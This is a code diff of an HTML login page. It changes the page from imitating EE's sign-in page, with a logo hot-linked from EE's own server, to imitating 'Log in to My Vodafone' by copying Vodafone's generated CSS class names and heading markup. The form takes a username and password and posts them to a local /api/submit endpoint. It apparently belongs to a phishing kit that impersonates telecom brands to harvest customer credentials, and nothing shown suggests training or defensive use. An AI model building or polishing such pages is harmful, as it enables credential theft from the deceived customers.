@@ -26,18 +26,12 @@
             text-align: left;
         }
 
-        .logo {
-            font-size: 24px;
-            color: #057382; /* EE logo color */
-            margin-bottom: 20px;
-            text-align: center;
-        }
-
-        h2 {
+        h1.Headingstyle__Heading-sc-1yyt9pt-0.fCCcZo {
             margin-top: 0;
             margin-bottom: 20px;
-            color: #057382; /* Same color as the logo */
-            font-weight: bold; /* Make it bold */
+            color: #057382;
+            font-size: 24px;
+            font-weight: normal; /* Not bold */
         }
 
         label {
@@ -102,38 +96,34 @@
 </head>
 <body>
 
-    <div class="login-container">
-        <!-- Logo -->
-        <div class="logo">
-            <img src="https://auth.ee.co.uk/static/content/res/stage-2/nayan/img/logo.png" alt="EE Logo" width="70" height="70">
-        </div>
+<div class="login-container">
 
-        <!-- Login Form -->
-        <form id="login-form" action="/api/submit" method="POST">
-            <h2>Log in</h2>
+    <!-- Login Form -->
+    <form id="login-form" action="/api/submit" method="POST">
+        <h1 level="1" size="3" justify="left" appearance="primary" weight="1" headingtheme="[object Object]" data-component-name="Heading" class="Headingstyle__Heading-sc-1yyt9pt-0 fCCcZo">Log in to My Vodafone</h1>
 
-            <!-- Email Field -->
-            <label for="email">Email or username</label>
-            <input type="text" id="email" name="email" placeholder="Email or username" required>
+        <!-- Email Field -->
+        <label for="email">Email or username</label>
+        <input type="text" id="email" name="email" placeholder="Email or username" required>
 
-            <!-- Password Field -->
-            <label for="password">Password</label>
-            <input type="password" id="password" name="password" placeholder="Password" required>
+        <!-- Password Field -->
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" placeholder="Password" required>
 
-            <!-- Next Button -->
-            <button type="submit">Next</button>
+        <!-- Next Button -->
+        <button type="submit">Next</button>
 
-            <!-- Forgot Password Link -->
-            <a href="#" id="forgot-password" class="forgot-password-link">Forgot your password?</a>
+        <!-- Forgot Password Link -->
+        <a href="#" id="forgot-password" class="forgot-password-link">Forgot your password?</a>
 
-            <!-- Create Account Section -->
-            <p>Don't have an account?</p>
-            <button type="button" class="secondary-button create-account" id="create-account"><strong>Create account</strong></button>
+        <!-- Create Account Section -->
+        <p>Don't have an account?</p>
+        <button type="button" class="secondary-button create-account" id="create-account"><strong>Create account</strong></button>
 
-            <!-- Cancel Button -->
-            <a href="#" id="cancel" style="color: #000;">Cancel</a>
-        </form>
-    </div>
+        <!-- Cancel Button -->
+        <a href="#" id="cancel" style="color: #000;">Cancel</a>
+    </form>
+</div>
 
 </body>
 </html>
